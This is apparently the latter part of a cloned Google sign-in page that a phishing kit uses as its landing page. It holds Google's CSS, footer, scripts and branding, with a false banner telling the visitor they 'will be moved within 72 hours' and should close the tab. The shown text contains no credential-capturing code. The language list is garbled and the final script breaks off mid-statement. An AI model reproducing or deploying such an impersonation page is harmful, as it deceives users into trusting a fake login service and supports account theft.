  -o-transition: transform 0.5s;
  transition: transform 0.5s;
  -webkit-transform: translate3d(0,
  -263px
, 0);
  -moz-transform: translate3d(0,
  -263px
, 0);
  -ms-transform: translate3d(0,
  -263px
, 0);
  -o-transform: translate3d(0,
  -263px
, 0);
  transform: translate3d(0,
  -263px
, 0);
;
  }
  .card-mask-wrap.has-captcha {
  -webkit-transform: translate3d(0,
  -93px
, 0);
  -moz-transform: translate3d(0,
  -93px
, 0);
  -ms-transform: translate3d(0,
  -93px
, 0);
  -o-transform: translate3d(0,
  -93px
, 0);
  transform: translate3d(0,
  -93px
, 0);
;
  }
  .card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -223px
, 0);
  -moz-transform: translate3d(0,
  -223px
, 0);
  -ms-transform: translate3d(0,
  -223px
, 0);
  -o-transform: translate3d(0,
  -223px
, 0);
  transform: translate3d(0,
  -223px
, 0);
;
  }
  .card-mask-wrap.has-captcha.has-error {
  -webkit-transform: translate3d(0,
  -53px
, 0);
  -moz-transform: translate3d(0,
  -53px
, 0);
  -ms-transform: translate3d(0,
  -53px
, 0);
  -o-transform: translate3d(0,
  -53px
, 0);
  transform: translate3d(0,
  -53px
, 0);
;
  }
  .shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -222px
, 0);
  -moz-transform: translate3d(0,
  -222px
, 0);
  -ms-transform: translate3d(0,
  -222px
, 0);
  -o-transform: translate3d(0,
  -222px
, 0);
  transform: translate3d(0,
  -222px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -182px
, 0);
  -moz-transform: translate3d(0,
  -182px
, 0);
  -ms-transform: translate3d(0,
  -182px
, 0);
  -o-transform: translate3d(0,
  -182px
, 0);
  transform: translate3d(0,
  -182px
, 0);
;
  }
  .shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -242px
, 0);
  -moz-transform: translate3d(0,
  -242px
, 0);
  -ms-transform: translate3d(0,
  -242px
, 0);
  -o-transform: translate3d(0,
  -242px
, 0);
  transform: translate3d(0,
  -242px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -202px
, 0);
  -moz-transform: translate3d(0,
  -202px
, 0);
  -ms-transform: translate3d(0,
  -202px
, 0);
  -o-transform: translate3d(0,
  -202px
, 0);
  transform: translate3d(0,
  -202px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -52px
, 0);
  -moz-transform: translate3d(0,
  -52px
, 0);
  -ms-transform: translate3d(0,
  -52px
, 0);
  -o-transform: translate3d(0,
  -52px
, 0);
  transform: translate3d(0,
  -52px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -72px
, 0);
  -moz-transform: translate3d(0,
  -72px
, 0);
  -ms-transform: translate3d(0,
  -72px
, 0);
  -o-transform: translate3d(0,
  -72px
, 0);
  transform: translate3d(0,
  -72px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -12px
, 0);
  -moz-transform: translate3d(0,
  -12px
, 0);
  -ms-transform: translate3d(0,
  -12px
, 0);
  -o-transform: translate3d(0,
  -12px
, 0);
  transform: translate3d(0,
  -12px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error.no-name {
  -webkit-transform: translate3d(0,
  -32px
, 0);
  -moz-transform: translate3d(0,
  -32px
, 0);
  -ms-transform: translate3d(0,
  -32px
, 0);
  -o-transform: translate3d(0,
  -32px
, 0);
  transform: translate3d(0,
  -32px
, 0);
;
  }
  .main-content {
  height: 450px;
;
  }
  .main-content.has-captcha {
  height: 620px;
;
  }
  .main-content.has-error {
  height: 490px;
;
  }
  .main-content.has-captcha.has-error {
  height: 660px;
;
  }
  .shift-form.main-content {
  height: 491px;
;
  }
  .has-error.shift-form.main-content {
  height: 531px;
;
  }
  .shift-form.main-content.no-name {
  height: 471px;
;
  }
  .has-error.shift-form.main-content.no-name {
  height: 511px;
;
  }
  .has-captcha.shift-form.main-content {
  height: 661px;
;
  }
  .has-captcha.shift-form.main-content.no-name {
  height: 641px;
;
  }
  .has-captcha.shift-form.main-content.has-error {
  height: 701px;
;
  }
  .has-captcha.shift-form.main-content.has-error.no-name {
  height: 681px;
;
  }
  .card-mask {
  background-color: #fff;
  background-position: 50% 0;
  background-repeat: no-repeat;
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAWgAAAAGCAIAAABhDpMcAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gkeFxks6YflLAAAAKlJREFUWMPt2CEShDAMheGmMCFV1MH9z8MtarC4QKfNiuwwOyxHeJ9r6iJ+ETKz3vu+7/M8D8MQAADetNaO41jXNcYYfUREpZRaK7YDAP9qraUUIvLn6NVg5t77tm2qamZYEwDciEhElmVhZm/H6B8ppZxzCOE8T4QDAB7hmKYp55xS+k48E601VVXV67oQDgB4hIOZRURE/BJKv5kwM1QDAF7bcR84Qggf4ShHovU/ogcAAAAASUVORK5CYII=);
  min-height: 300px;
  }
.card {
  margin-bottom: 0;
}
.one-google {
  padding-top: 27px;
}
#canvas {
  -webkit-transition: opacity 0.075s;
  -moz-transition: opacity 0.075s;
  -ms-transition: opacity 0.075s;
  -o-transition: opacity 0.075s;
  transition: opacity 0.075s;
  opacity: 0.01;
}
.shift-form #canvas {
  opacity: 0.99;
}
.label {
  color: #404040;
}
#account-chooser-link {
  -webkit-transition: opacity 0.3s;
  -moz-transition: opacity 0.3s;
  -ms-transition: opacity 0.3s;
  -o-transition: opacity 0.3s;
  transition: opacity 0.3s;
}
.input-wrapper {
  position: relative;
}
.google-footer-bar {
  z-index: 2;
}
</style>
<style media="screen and (max-width: 580px)">
.back-arrow {
  top: 17px;
}
.circle-mask {
  height: 72px;
  width: 72px;
  background-size: 72px;
}
.circle {
  height: 72px;
  width: 72px;
}
#canvas {
  height: 72px;
  width: 72px;
}
.form-panel {
  width: 256px;
}
.card-mask-wrap {
  width: 300px;
}
  .card-mask {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAS4AAAAGCAIAAADyquT7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNS4xIFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RDcyMjMyQ0NFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RDcyMjMyQ0RFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpENzIyMzJDQUU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpENzIyMzJDQkU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqGCc+MAAACnSURBVHja7Ng7DoQgFIXhYTAKFXS6//W4CxtaOh4B5sQ7mcwGpDpfpdjd5M9V1Rij9x5CcM5prV9ENEtrLcZ4HMcb5EgpdV1XrZXTIZoDuSE6pCe3i3S4rit243meKSXsSY6J6FGIzhiz7zvSkxoXeWCt9d7jIufMFIkmpLhtG6JDet8TCQ/vrOlWSmGKRBNSxD40N/lHo/7DGzeOiWhOjb8PRfgIMAAaYEeit6tkKwAAAABJRU5ErkJggg==);
  }
  .card-mask-wrap {
  -webkit-transform: translate3d(0,
  -288px
, 0);
  -moz-transform: translate3d(0,
  -288px
, 0);
  -ms-transform: translate3d(0,
  -288px
, 0);
  -o-transform: translate3d(0,
  -288px
, 0);
  transform: translate3d(0,
  -288px
, 0);
;
  }
  .card-mask-wrap.has-captcha {
  -webkit-transform: translate3d(0,
  -118px
, 0);
  -moz-transform: translate3d(0,
  -118px
, 0);
  -ms-transform: translate3d(0,
  -118px
, 0);
  -o-transform: translate3d(0,
  -118px
, 0);
  transform: translate3d(0,
  -118px
, 0);
;
  }
  .card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -248px
, 0);
  -moz-transform: translate3d(0,
  -248px
, 0);
  -ms-transform: translate3d(0,
  -248px
, 0);
  -o-transform: translate3d(0,
  -248px
, 0);
  transform: translate3d(0,
  -248px
, 0);
;
  }
  .card-mask-wrap.has-captcha.has-error {
  -webkit-transform: translate3d(0,
  -78px
, 0);
  -moz-transform: translate3d(0,
  -78px
, 0);
  -ms-transform: translate3d(0,
  -78px
, 0);
  -o-transform: translate3d(0,
  -78px
, 0);
  transform: translate3d(0,
  -78px
, 0);
;
  }
  .shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -247px
, 0);
  -moz-transform: translate3d(0,
  -247px
, 0);
  -ms-transform: translate3d(0,
  -247px
, 0);
  -o-transform: translate3d(0,
  -247px
, 0);
  transform: translate3d(0,
  -247px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -207px
, 0);
  -moz-transform: translate3d(0,
  -207px
, 0);
  -ms-transform: translate3d(0,
  -207px
, 0);
  -o-transform: translate3d(0,
  -207px
, 0);
  transform: translate3d(0,
  -207px
, 0);
;
  }
  .shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -267px
, 0);
  -moz-transform: translate3d(0,
  -267px
, 0);
  -ms-transform: translate3d(0,
  -267px
, 0);
  -o-transform: translate3d(0,
  -267px
, 0);
  transform: translate3d(0,
  -267px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -227px
, 0);
  -moz-transform: translate3d(0,
  -227px
, 0);
  -ms-transform: translate3d(0,
  -227px
, 0);
  -o-transform: translate3d(0,
  -227px
, 0);
  transform: translate3d(0,
  -227px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -77px
, 0);
  -moz-transform: translate3d(0,
  -77px
, 0);
  -ms-transform: translate3d(0,
  -77px
, 0);
  -o-transform: translate3d(0,
  -77px
, 0);
  transform: translate3d(0,
  -77px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -97px
, 0);
  -moz-transform: translate3d(0,
  -97px
, 0);
  -ms-transform: translate3d(0,
  -97px
, 0);
  -o-transform: translate3d(0,
  -97px
, 0);
  transform: translate3d(0,
  -97px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -37px
, 0);
  -moz-transform: translate3d(0,
  -37px
, 0);
  -ms-transform: translate3d(0,
  -37px
, 0);
  -o-transform: translate3d(0,
  -37px
, 0);
  transform: translate3d(0,
  -37px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error.no-name {
  -webkit-transform: translate3d(0,
  -57px
, 0);
  -moz-transform: translate3d(0,
  -57px
, 0);
  -ms-transform: translate3d(0,
  -57px
, 0);
  -o-transform: translate3d(0,
  -57px
, 0);
  transform: translate3d(0,
  -57px
, 0);
;
  }
  .main-content {
  height: 350px;
;
  }
  .main-content.has-captcha {
  height: 520px;
;
  }
  .main-content.has-error {
  height: 390px;
;
  }
  .main-content.has-captcha.has-error {
  height: 560px;
;
  }
  .shift-form.main-content {
  height: 391px;
;
  }
  .has-error.shift-form.main-content {
  height: 431px;
;
  }
  .shift-form.main-content.no-name {
  height: 371px;
;
  }
  .has-error.shift-form.main-content.no-name {
  height: 411px;
;
  }
  .has-captcha.shift-form.main-content {
  height: 561px;
;
  }
  .has-captcha.shift-form.main-content.no-name {
  height: 541px;
;
  }
  .has-captcha.shift-form.main-content.has-error {
  height: 601px;
;
  }
  .has-captcha.shift-form.main-content.has-error.no-name {
  height: 581px;
;
  }
.signin-card {
  width: 256px;
}
.signin-card #EmailFirst {
  margin-top: 15px;
}
.one-google {
  padding-top: 22px;
}
</style>
  </head>
  <body>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="Google"></div>
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  You will be moved within 72 hours.... 
</h1>
  <h2 class="hidden-small">
  We will send you a confirmation mail.<br> Please close this tab.
  </h2>
</div>

<br>


  </div>
  </div>
  </div>
</div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a href="https://www.google.com/intl/en/about" target="_blank">
  About Google
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=IN&hl=en&privacy=true" target="_blank">
  Privacy
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=IN&hl=en" target="_blank">
  Terms
  </a>
  </li>
  <li>
  <a href="http://www.google.com/support/accounts?hl=en" target="_blank">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: none">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="google/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af"
                 >
  ?Afrikaans?
  </option>
  <option value="az"
                 >
  ?az?rbaycan dili?
  </option>
  <option value="ms"
                 >
  ?Bahasa Melayu?
  </option>
  <option value="ca"
                 >
  ?catal�?
  </option>
  <option value="cs"
                 >
  ?Ce�tina?
  </option>
  <option value="da"
                 >
  ?Dansk?
  </option>
  <option value="de"
                 >
  ?Deutsch?
  </option>
  <option value="et"
                 >
  ?eesti?
  </option>
  <option value="en-GB"
                 >
  ?English (United Kingdom)?
  </option>
  <option value="en"
                
                  selected="selected"
                 >
  ?English (United States)?
  </option>
  <option value="es"
                 >
  ?Espa�ol (Espa�a)?
  </option>
  <option value="es-419"
                 >
  ?Espa�ol (Latinoam�rica)?
  </option>
  <option value="eu"
                 >
  ?euskara?
  </option>
  <option value="fil"
                 >
  ?Filipino?
  </option>
  <option value="fr-CA"
                 >
  ?Fran�ais (Canada)?
  </option>
  <option value="fr"
                 >
  ?Fran�ais (France)?
  </option>
  <option value="gl"
                 >
  ?galego?
  </option>
  <option value="hr"
                 >
  ?Hrvatski?
  </option>
  <option value="in"
                 >
  ?Indonesia?
  </option>
  <option value="zu"
                 >
  ?isiZulu?
  </option>
  <option value="is"
                 >
  ?�slenska?
  </option>
  <option value="it"
                 >
  ?Italiano?
  </option>
  <option value="sw"
                 >
  ?Kiswahili?
  </option>
  <option value="lv"
                 >
  ?latvie�u?
  </option>
  <option value="lt"
                 >
  ?lietuviu?
  </option>
  <option value="hu"
                 >
  ?magyar?
  </option>
  <option value="nl"
                 >
  ?Nederlands?
  </option>
  <option value="no"
                 >
  ?norsk?
  </option>
  <option value="pl"
                 >
  ?polski?
  </option>
  <option value="pt"
                 >
  ?Portugu�s (Brasil)?
  </option>
  <option value="pt-PT"
                 >
  ?portugu�s (Portugal)?
  </option>
  <option value="ro"
                 >
  ?rom�na?
  </option>
  <option value="sk"
                 >
  ?Slovencina?
  </option>
  <option value="sl"
                 >
  ?sloven�cina?
  </option>
  <option value="fi"
                 >
  ?Suomi?
  </option>
  <option value="sv"
                 >
  ?Svenska?
  </option>
  <option value="vi"
                 >
  ?Ti?ng Vi?t?
  </option>
  <option value="tr"
                 >
  ?T�rk�e?
  </option>
  <option value="el"
                 >
  ??????????
  </option>
  <option value="bg"
                 >
  ???????????
  </option>
  <option value="mn"
                 >
  ????????
  </option>
  <option value="ru"
                 >
  ?????????
  </option>
  <option value="sr"
                 >
  ????????
  </option>
  <option value="uk"
                 >
  ????????????
  </option>
  <option value="ka"
                 >
  ?????????
  </option>
  <option value="hy"
                 >
  ?????????
  </option>
  <option value="iw"
                 >
  ????????
  </option>
  <option value="ur"
                 >
  ???????
  </option>
  <option value="ar"
                 >
  ??????????
  </option>
  <option value="fa"
                 >
  ????????
  </option>
  <option value="am"
                 >
  ??????
  </option>
  <option value="ne"
                 >
  ????????
  </option>
  <option value="mr"
                 >
  ???????
  </option>
  <option value="hi"
                 >
  ????????
  </option>
  <option value="bn"
                 >
  ???????
  </option>
  <option value="gu"
                 >
  ?????????
  </option>
  <option value="ta"
                 >
  ???????
  </option>
  <option value="te"
                 >
  ????????
  </option>
  <option value="kn"
                 >
  ???????
  </option>
  <option value="ml"
                 >
  ????????
  </option>
  <option value="si"
                 >
  ???????
  </option>
  <option value="th"
                 >
  ?????
  </option>
  <option value="lo"
                 >
  ?????
  </option>
  <option value="km"
                 >
  ???????
  </option>
  <option value="ko"
                 >
  ?????
  </option>
  <option value="zh-HK"
                 >
  ???(??)?
  </option>
  <option value="ja"
                 >
  ?????
  </option>
  <option value="zh-CN"
                 >
  ??????
  </option>
  <option value="zh-TW"
                 >
  ??????
  </option>
  </select>
  </span>
  </div>
  </div>
</div>
  </div>
  <script>
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var appendHiddenParams = function(query) {
          var loginForm = document.getElementById('gaia_loginform');
          if (loginForm) {
            var loginInputs = loginForm.getElementsByTagName('input');
            for (var i = 0, input; input = loginInputs[i]; i++) {
              if (input.type == 'hidden' && input.value && !query[input.name]) {
                query[input.name] = input.value;
              }
            }
          }
        }
        var post = function(path, params) {
          var form = document.createElement('form');
          form.setAttribute('method', 'post');
          form.setAttribute('action', path);

          for (var key in params) {
            if (params.hasOwnProperty(key)) {
              var hiddenField = document.createElement('input');
              hiddenField.setAttribute('type', 'hidden');
              hiddenField.setAttribute('name', key);
              hiddenField.setAttribute('value', params[key]);

              form.appendChild(hiddenField);
            }
          }

          document.body.appendChild(form);
          form.submit();
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var hiddenEmailInput = document.getElementById('Email-hidden');
            if (hiddenEmailInput) {
              // If we are in password separation on password page, post to
              // /AccountLoginInfo.
              appendHiddenParams(langChooser_params);
              langChooser_params['Email'] = hiddenEmailInput.value;
              post('/AccountLoginInfo', langChooser_params);
            } else {
              var paramsStr = langChooser_getParamStr(langChooser_params);
              var newHref = langChooser_currentPath + "?" + paramsStr;
              if (langChooser_fragment) {
                newHref = newHref + "#" + langChooser_fragment;
              }
              window.location.href = newHref;
            }
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script>var G,Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gf=function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Gd(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Ge(a,b).push(d);return d},Gg=function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Gd(b);return d};a.attachEvent("on"+b,d);Ge(a,b).push(d);return d},Gh;Gh=window.addEventListener?Gf:window.attachEvent?Gg:void 0;var Gd=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1};
var Ge=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gi=function(){try{return new XMLHttpRequest}catch(c){for(var a=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],b=0;b<a.length;b++)try{return new ActiveXObject(a[b])}catch(d){}}return null},Gj=function(){this.request=Gi();this.parameters={}};
Gj.prototype.send=function(a,b){var c=[],d;for(d in this.parameters){var e=this.parameters[d];c.push(d+"="+encodeURIComponent(e))}var c=c.join("&"),f=this.request;f.open("POST",a,!0);f.setRequestHeader("Content-type","application/x-www-form-urlencoded");f.onreadystatechange=function(){4==f.readyState&&b({status:f.status,text:f.responseText})};f.send(c)};
Gj.prototype.get=function(a,b){var c=this.request;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gl=function(a){this.g=a;this.v=this.o();if(null==this.g)throw new Gk("Empty module name");};G=Gl.prototype;G.o=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
G.j=function(a,b,c){var d=this.v,e=this.g||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gj;d.parameters={};try{var e=this.j(a,b,c);d.get(e,function(){})}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};
G.warn=function(a,b){this.send("WARN",a,b)};G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gk=function(){};var Gm=Gm||new Gl("uri"),Gn=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Go=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gp=function(a,b){var c=b.match(Gn)[1]||null,d,e=b.match(Gn)[3]||null;d=e&&decodeURIComponent(e);e=Number(b.match(Gn)[4]||null)||null;if(!c||!d)return Gm.error("Invalid origin Exception",[String(b)]),!1;e||(e=Go(c));var f=a.match(Gn)[1]||null;if(!f||f.toLowerCase()!=
c.toLowerCase())return!1;c=(c=a.match(Gn)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return!1;(d=Number(a.match(Gn)[4]||null)||null)||(d=Go(f));return e==d};var Gq=Gq||new Gl("check_connection"),Gr=null,Gs=null,Gt=null,Gu=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gu.prototype;G.i=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Gq.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.h=function(a){return this.i(a,Gs)};G.w=function(a){return this.i(a,Gt)};G.m=function(a){a=a.match("^([^:]+):(\\d*):(\\d?)$");return!a||3>a.length?null:a[1]};
G.u=function(a,b){if(!Gp(this.c,a))return!1;if(this.a||!b)return!0;"accessible"==b?(this.h(a),this.a=!0):this.m(b)==this.b&&(this.w(b)||this.h(a),this.a=!0);return!0};G.s=function(){var a;a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
G.l=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.s();a.id=this.b;Gr.appendChild(a)};
var Gv=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].u(c,b);e++);}},Gw=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gr=document.getElementById(a))?(b&&(Gs=document.getElementById(b)),c&&(Gt=document.getElementById(c)),Gs||Gt?a=!0:(Gq.error("Unable to locate the input element to storeCheckConnection result",
["old id: "+String(b),"new id: "+String(c)]),a=!1)):(Gq.error("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Gq.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gu(a[d].iframeUri,a[d].domainSymbol));
Gh(window,"message",Gv(c));for(d=0;d<b;d++)c[d].l()}}}},Gx=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Gq.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Gq.f(Gw);G_setPostMessageSupportFlag=Gq.f(Gx);
</script>
  <script>
  window.__CHECK_CONNECTION_CONFIG = {
  newResultElementId: 'checkConnection',
  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\x3dhttps%3A%2F%2Faccounts.google.com\x26v\x3d-259532682',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  connectivityElementId: 'dnConn',
  iframeParentElementId: 'cc_iframe_parent',
  postMsgSupportElementId: 'pstMsg',
  msgContent: 'accessible'
  };
  G_setPostMessageSupportFlag();
  G_checkConnectionMain();
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */(function(){eval('var V=function(d,e,x,c,Q){x=d.split("."),c=O,x[0]in c||!c.execScript||c.execScript("var "+x[0]);for(;x.length&&(Q=x.shift());)x.length||void 0===e?c=c[Q]?c[Q]:c[Q]={}:c[Q]=e},O=this,u=function(d,e,x){return 2>=arguments.length?Array.prototype.slice.call(d,e):Array.prototype.slice.call(d,e,x)},K=function(d,e,x){if(e=typeof d,"object"==e)if(d){if(d instanceof Array)return"array";if(d instanceof Object)return e;if(x=Object.prototype.toString.call(d),"[object Window]"==x)return"object";if("[object Array]"==x||"number"==typeof d.length&&"undefined"!=typeof d.splice&&"undefined"!=typeof d.propertyIsEnumerable&&!d.propertyIsEnumerable("splice"))return"array";if("[object Function]"==x||"undefined"!=typeof d.call&&"undefined"!=typeof d.propertyIsEnumerable&&!d.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==e&&"undefined"==typeof d.call)return"object";return e},D,q=(new function(){},function(d,e,x,c,Q,F,U,N,p){return N=n,Q=n.prototype,U=Q.D,c=function(){return x()},p=Q.g,F=Q.l,x=function(d,S,B){for(d=c[Q.P],S=d===e,B=0,d=d&&d[Q.P];d&&d!=F&&d!=U&&d!=N&&d!=p&&20>B;)B++,d=d[Q.P];return x[Q.X6+S+!(!d+(B+3>>3))]},c[Q.L]=function(d){x[Q.O]=d},c[Q.L](d),d=c}),X=function(d,e){d.G=[],Y(d,d.I,0),Y(d,d.$,0),Y(d,d.K,0),Y(d,d.X,[]),d.b=true,Y(d,d.B,2048),Y(d,d.GO,d),Y(d,d.C,E(4)),Y(d,d.T,0),Y(d,d.v,{}),Y(d,d.a,[]),Y(d,d.cT,"object"==typeof 